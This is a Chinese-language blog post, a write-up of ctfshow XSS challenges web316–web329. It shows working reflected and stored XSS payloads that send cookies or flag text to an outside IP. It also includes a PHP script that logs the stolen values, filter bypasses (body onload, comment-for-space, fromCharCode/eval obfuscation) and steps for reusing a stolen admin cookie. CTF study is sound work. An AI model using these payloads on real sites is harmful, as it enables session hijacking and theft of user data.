@@ -1,0 +1,773 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MaskObito">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="反射型XSSweb316无任何过滤尝试基本语句 1&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;   能成功弹窗  查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析  X自己语句1&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;   X管理员（核心语">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-XSS">
+<meta property="og:url" content="http://maskobito.github.io/2025/03/19/CTF-XSS/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="反射型XSSweb316无任何过滤尝试基本语句 1&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;   能成功弹窗  查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析  X自己语句1&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;   X管理员（核心语">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/17d515a9-59dd-4815-83ca-acdbe7ac1fe7.png">
+<meta property="og:image" content="http://maskobito.github.io/images/762b66f5-2793-4220-994d-25f82892817a.png">
+<meta property="og:image" content="http://maskobito.github.io/images/4414824b-095e-48e6-aae1-166dda83702f.png">
+<meta property="og:image" content="http://maskobito.github.io/images/9448c6ed-a521-4775-923b-d079985f1696.png">
+<meta property="og:image" content="http://maskobito.github.io/images/91710886-6c9c-44cc-8a01-b8357e1eec6f.png">
+<meta property="og:image" content="http://maskobito.github.io/images/68941b50-a43e-4e17-b804-5b0cccda7854.png">
+<meta property="og:image" content="http://maskobito.github.io/images/88f40d0a-228c-4683-9da9-7ca52549f0e9.png">
+<meta property="og:image" content="http://maskobito.github.io/images/d3c40c47-11f8-4b82-9207-1ad24bfeebc7.png">
+<meta property="og:image" content="http://maskobito.github.io/images/4d234639-fe47-43a9-91d4-ef583763db8f.png">
+<meta property="og:image" content="http://maskobito.github.io/images/c1c2e9d4-0aeb-4dc8-a70d-46ae06c57422.png">
+<meta property="og:image" content="http://maskobito.github.io/images/d4c59604-4437-4706-a72d-6b9aea421887.png">
+<meta property="og:image" content="http://maskobito.github.io/images/f8f4f060-2468-454e-b575-273f4fe1cffc.png">
+<meta property="og:image" content="http://maskobito.github.io/images/c10b18e5-ab61-4f62-9c73-57d1f4df6eb1.png">
+<meta property="og:image" content="http://maskobito.github.io/images/4b274185-0720-4d11-af82-27023fad884d.png">
+<meta property="og:image" content="http://maskobito.github.io/images/27415cac-32c8-438e-a5c5-fc6c89e50b4c.png">
+<meta property="og:image" content="http://maskobito.github.io/images/a1cf486c-24ee-44d3-8282-cced8c1c5826.png">
+<meta property="og:image" content="http://maskobito.github.io/images/1fe5dadb-b377-4faa-a540-0338d60fee4f.png">
+<meta property="og:image" content="http://maskobito.github.io/images/f089410c-dd4e-4ebe-9bdd-e2ba256c1b0e.png">
+<meta property="og:image" content="http://maskobito.github.io/images/cbed9e4d-2e49-4deb-b764-09cb3bebff38.png">
+<meta property="article:published_time" content="2025-03-18T23:20:14.000Z">
+<meta property="article:modified_time" content="2025-09-20T15:39:49.676Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/17d515a9-59dd-4815-83ca-acdbe7ac1fe7.png">
+  
+  
+  
+  <title>CTF-XSS - MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF-XSS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-19 07:20" pubdate>
+          2025年3月19日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF-XSS</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><h4 id="无任何过滤"><a href="#无任何过滤" class="headerlink" title="无任何过滤"></a>无任何过滤</h4><p>尝试基本语句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/17d515a9-59dd-4815-83ca-acdbe7ac1fe7.png" srcset="/img/loading.gif" lazyload alt="17d515a9-59dd-4815-83ca-acdbe7ac1fe7"></p>
+<p>能成功弹窗</p>
+<p><img src="/../images/762b66f5-2793-4220-994d-25f82892817a.png" srcset="/img/loading.gif" lazyload alt="762b66f5-2793-4220-994d-25f82892817a"></p>
+<p>查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析</p>
+<p><img src="/../images/4414824b-095e-48e6-aae1-166dda83702f.png" srcset="/img/loading.gif" lazyload alt="4414824b-095e-48e6-aae1-166dda83702f"></p>
+<h5 id="X自己语句"><a href="#X自己语句" class="headerlink" title="X自己语句"></a>X自己语句</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/9448c6ed-a521-4775-923b-d079985f1696.png" srcset="/img/loading.gif" lazyload alt="9448c6ed-a521-4775-923b-d079985f1696"></p>
+<h5 id="X管理员（核心语句）："><a href="#X管理员（核心语句）：" class="headerlink" title="X管理员（核心语句）："></a>X管理员（核心语句）：</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://47.110.94.3/x.php?1=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>&lt;script&gt;</code> 标签</strong>: 这是浏览器识别并执行JavaScript代码的标准方式。</li>
+<li><strong><code>document.cookie</code></strong>: 这是JavaScript中用来<strong>读取当前网站下所有Cookie</strong>的对象（HttpOnly Cookie除外）。Cookie中通常包含最关键的认证信息，例如用户的会话ID（Session ID）。</li>
+<li><strong><code>document.location.href</code></strong>: 这是控制浏览器地址栏的属性。给它赋值，会<strong>强制浏览器立即跳转</strong>到指定的URL。</li>
+<li><strong>字符串拼接</strong>: 将 <code>http://47.110.94.3/x.php?1=</code> 和读取到的 <code>document.cookie</code> 拼接成一个完整的URL。</li>
+</ul>
+<p><strong>这段代码的作用是：</strong> 当它在受害者的浏览器中被执行时，会立刻将浏览器重定向到你的服务器上的 <code>x.php</code> 文件，并将受害者当前网站的所有Cookie作为一个参数（参数名为 <code>1</code>）发送给你的服务器。</p>
+<p>x.php内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]; <span class="hljs-comment">// 从URL中获取名为&quot;1&quot;的参数值</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$content</span>))&#123; <span class="hljs-comment">// 判断这个参数是否存在</span><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;tmp/flag.txt&#x27;</span>, <span class="hljs-variable">$content</span>); <span class="hljs-comment">// 将参数的值写入到&quot;tmp/flag.txt&quot;文件中</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no date input&#x27;</span>; <span class="hljs-comment">// 如果不存在参数，输出错误信息</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>$_GET[1]</code></strong>: PHP的超全局数组，用于获取通过URL传递的GET参数。例如，访问 <code>http://47.110.94.3/x.php?1=hello</code>，那么 <code>$_GET[1]</code> 的值就是 <code>hello</code>。</li>
+<li><strong><code>file_put_contents()</code></strong>: PHP函数，将内容写入文件。如果文件不存在，它会尝试创建。</li>
+<li><strong><code>tmp/flag.txt</code></strong>: 这是你指定的输出文件。请确保 <code>tmp</code> 目录存在并且有可写权限（通常需要 <code>chmod 777 tmp</code> 或类似权限），否则脚本会报错。</li>
+</ul>
+<p><strong>这个脚本的作用是：</strong> 接收从受害者浏览器发来的GET请求，取出其中的Cookie数据，然后安静地将这些数据保存到服务器的 <code>tmp/flag.txt</code> 文件中, 成功地窃取到了受害者的Cookie。</p>
+<p><img src="/../images/91710886-6c9c-44cc-8a01-b8357e1eec6f.png" srcset="/img/loading.gif" lazyload alt="91710886-6c9c-44cc-8a01-b8357e1eec6f"></p>
+<h3 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h3><h4 id="过滤了script标签（包括大小写双写等）改用body标签绕过（注意引号）"><a href="#过滤了script标签（包括大小写双写等）改用body标签绕过（注意引号）" class="headerlink" title="过滤了script标签（包括大小写双写等）改用body标签绕过（注意引号）"></a>过滤了script标签（包括大小写双写等）改用body标签绕过（注意引号）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;body onload=<span class="hljs-string">&quot;document.location.href=&#x27;http://47.110.94.3/x.php?1=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h3><h4 id="过滤了空格，用-或者-代替"><a href="#过滤了空格，用-或者-代替" class="headerlink" title="过滤了空格，用&#x2F;或者&#x2F;**&#x2F;代替"></a>过滤了空格，用&#x2F;或者&#x2F;**&#x2F;代替</h4><p>也可以试：%0d是回车符 %09是制表符 %0a是换行符</p>
+<p>&amp;#32是空格的HTML实体 &amp;#x20是空格的十六进制HTML实体</p>
+<h4 id="String-fromCharCode配合eval使用"><a href="#String-fromCharCode配合eval使用" class="headerlink" title="String.fromCharCode配合eval使用"></a>String.fromCharCode配合eval使用</h4><p>许多 XSS 过滤器会检测关键词，但不会解码数字序列，利用ascii码转字符</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,52,55,46,49,49,48,46,57,52,46,51,47,120,46,112,104,112,63,49,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="可用Function替代eval，常用测试语句："><a href="#可用Function替代eval，常用测试语句：" class="headerlink" title="可用Function替代eval，常用测试语句："></a>可用Function替代eval，常用测试语句：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;Function(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))()&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/68941b50-a43e-4e17-b804-5b0cccda7854.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="字符串转ascii码脚本"><a href="#字符串转ascii码脚本" class="headerlink" title="字符串转ascii码脚本"></a>字符串转ascii码脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">input_str = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入字符串: &quot;</span>)  <span class="hljs-comment"># 获取用户输入的字符串</span><br>ascii_list = []<br><span class="hljs-comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:<br>    ascii_code = <span class="hljs-built_in">ord</span>(char)  <span class="hljs-comment"># 使用ord()函数获取字符的ASCII码</span><br>    ascii_list.append(<span class="hljs-built_in">str</span>(ascii_code))  <span class="hljs-comment"># 将ASCII码转换为字符串并添加到列表</span><br><span class="hljs-comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span><br>result = <span class="hljs-string">&#x27;,&#x27;</span>.join(ascii_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转换后的ASCII码:&quot;</span>, result)<br></code></pre></td></tr></table></figure>
+
+<h5 id="ascii码转字符串脚本"><a href="#ascii码转字符串脚本" class="headerlink" title="ascii码转字符串脚本"></a>ascii码转字符串脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_to_string</span>(<span class="hljs-params">ascii_str</span>):<br>    <span class="hljs-comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span><br>    ascii_list = ascii_str.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    <span class="hljs-comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(code)) <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> ascii_list)<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-comment"># 输入以逗号分隔的ASCII码字符串</span><br>ascii_str = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)<br><br><span class="hljs-comment"># 调用函数进行转换并打印结果</span><br>string_result = ascii_to_string(ascii_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转换后的字符串:&quot;</span>, string_result)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><h4 id="在留言板发送xss语句获取管理员cookie"><a href="#在留言板发送xss语句获取管理员cookie" class="headerlink" title="在留言板发送xss语句获取管理员cookie"></a>在留言板发送xss语句获取管理员cookie</h4><p>发件失败，cookie发现不是管理员</p>
+<p><img src="/../images/88f40d0a-228c-4683-9da9-7ca52549f0e9.png" srcset="/img/loading.gif" lazyload alt="88f40d0a-228c-4683-9da9-7ca52549f0e9"></p>
+<p>发送xss语句给admin试试看</p>
+<p><img src="/../images/d3c40c47-11f8-4b82-9207-1ad24bfeebc7.png" srcset="/img/loading.gif" lazyload alt="d3c40c47-11f8-4b82-9207-1ad24bfeebc7"></p>
+<p>显示发送成功，查看flag.txt即可。</p>
+<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><h4 id="通过注册账号或密码时使用xss语句获取管理员cookie"><a href="#通过注册账号或密码时使用xss语句获取管理员cookie" class="headerlink" title="通过注册账号或密码时使用xss语句获取管理员cookie"></a>通过注册账号或密码时使用xss语句获取管理员cookie</h4><p>注册时用xss语句输入账号密码</p>
+<p><img src="/../images/4d234639-fe47-43a9-91d4-ef583763db8f.png" srcset="/img/loading.gif" lazyload alt="4d234639-fe47-43a9-91d4-ef583763db8f"></p>
+<p>成功登录</p>
+<p><img src="/../images/c1c2e9d4-0aeb-4dc8-a70d-46ae06c57422.png" srcset="/img/loading.gif" lazyload alt="c1c2e9d4-0aeb-4dc8-a70d-46ae06c57422"></p>
+<p>导入数据库成功</p>
+<p><img src="/../images/d4c59604-4437-4706-a72d-6b9aea421887.png" srcset="/img/loading.gif" lazyload alt="d4c59604-4437-4706-a72d-6b9aea421887"></p>
+<p>flag.txt获得管理员cookie，修改cookie成功登录管理员账号。</p>
+<p><img src="/../images/f8f4f060-2468-454e-b575-273f4fe1cffc.png" srcset="/img/loading.gif" lazyload alt="f8f4f060-2468-454e-b575-273f4fe1cffc"></p>
+<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><h4 id="在管理员未退出时马上执行脚本利用cookie"><a href="#在管理员未退出时马上执行脚本利用cookie" class="headerlink" title="在管理员未退出时马上执行脚本利用cookie"></a>在管理员未退出时马上执行脚本利用cookie</h4><p>这一关和上一关很像，但是有一个区别就是能得到cookie但是还是访问不了页面 原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie。</p>
+<p>抓包查看发现每次获取信息都是这么一个数据包</p>
+<p>我们尝试构造一个php脚本，当他获取到cookie时，就去发送这个数据包，如果够快是可以获取到flag的</p>
+<p>先找类名</p>
+<p><img src="/../images/c10b18e5-ab61-4f62-9c73-57d1f4df6eb1.png" srcset="/img/loading.gif" lazyload alt="c10b18e5-ab61-4f62-9c73-57d1f4df6eb1"></p>
+<p>语句</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index,value</span>)&#123;<span class="hljs-keyword">if</span>(value.<span class="hljs-property">innerText</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span>)&gt;-<span class="hljs-number">1</span>)&#123;location.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://47.110.94.3/x.php?1=&#x27;</span>+value.<span class="hljs-property">innerText</span>&#125;&#125;);&lt;/script&gt; <br></code></pre></td></tr></table></figure>
+
+<p>分析</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 1. 使用jQuery选择器</span><br>&lt;script&gt;<br>$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index, value</span>) &#123;<br>  <span class="hljs-comment">// 2. 遍历匹配的元素</span><br>  <span class="hljs-keyword">if</span> (value.<span class="hljs-property">innerText</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// 3. 检查元素文本内容</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;http://47.110.94.3/x.php?1=&#x27;</span> + value.<span class="hljs-property">innerText</span>;<br>    <span class="hljs-comment">// 4. 如果找到，则发起请求</span><br>  &#125;<br>&#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><code>$(&#39;.laytable-cell-1-0-1&#39;).each(...)</code></li>
+</ol>
+<ul>
+<li><strong><code>$(&#39;.laytable-cell-1-0-1&#39;)</code></strong>： 这是 jQuery 的选择器语法。它在整个 HTML 文档中查找所有 <strong>class</strong> 属性包含 <code>laytable-cell-1-0-1</code> 的 HTML 元素。<ul>
+<li><code>laytable</code> 是一个常见的类名，通常来自于 <strong>layui 框架的 table 模块</strong>。这意味着目标网站很可能使用了 layui 来渲染表格。</li>
+<li><code>1-0-1</code> 可能表示第1行、第0列（索引从0开始）的单元格，或者是一种通用的命名模式。攻击者通过分析网页结构，发现flag就藏在具有这类class的表格单元格中。</li>
+</ul>
+</li>
+<li><strong><code>.each(function(index, value) &#123; ... &#125;)</code></strong>： 这是一个 jQuery 方法，用于遍历前面选择器匹配到的每一个元素。对每个元素，都会执行一次括号内定义的函数。<code>value</code> 参数代表当前正在遍历的 DOM 元素本身。</li>
+</ul>
+<ol start="2">
+<li><code>if (value.innerText.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)</code></li>
+</ol>
+<ul>
+<li><strong><code>value.innerText</code></strong>： 获取当前遍历的HTML元素的<strong>文本内容</strong>（不包括HTML标签）。</li>
+<li><strong><code>indexOf(&#39;ctfshow&#123;&#39;) &gt; -1</code></strong>： 检查获取到的文本内容中是否包含子字符串 <code>ctfshow&#123;</code>。<ul>
+<li><code>ctfshow&#123;</code> 是 <strong>CTF（Capture The Flag）竞赛</strong>中一种非常常见的flag格式的开头，格式通常为 <code>ctfshow&#123;This_is_a_flag&#125;</code>。</li>
+<li>如果字符串存在，<code>indexOf()</code> 返回其起始索引（&gt;&#x3D;0）；如果不存在，返回 -1。所以 <code>&gt; -1</code> 判断为真，就意味着<strong>找到了flag</strong>。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li><code>document.location.href = &#39;http://47.110.94.3/x.php?1=&#39; + value.innerText;</code></li>
+</ol>
+<ul>
+<li>这是整个 payload 的<strong>最终目的——窃取数据</strong>。</li>
+<li><strong><code>document.location.href</code></strong>： 这是浏览器的当前地址。给这个属性赋一个新的 URL，会立即导致浏览器跳转到该地址。</li>
+<li><strong><code>&#39;http://47.110.94.3/x.php?1=&#39; + value.innerText</code></strong>：<ul>
+<li>这里构造了一个指向攻击者控制的服务器（<code>47.110.94.3</code>）上某个脚本（<code>x.php</code>）的 URL。</li>
+<li>它将找到的flag文本（<code>value.innerText</code>，例如 <code>ctfshow&#123;my_super_flag&#125;</code>）作为查询参数 <code>1</code> 的值附加在URL后面。</li>
+<li>当浏览器跳转到这个URL时，就会向攻击者的服务器发起一个 <strong>HTTP GET 请求</strong>。</li>
+</ul>
+</li>
+</ul>
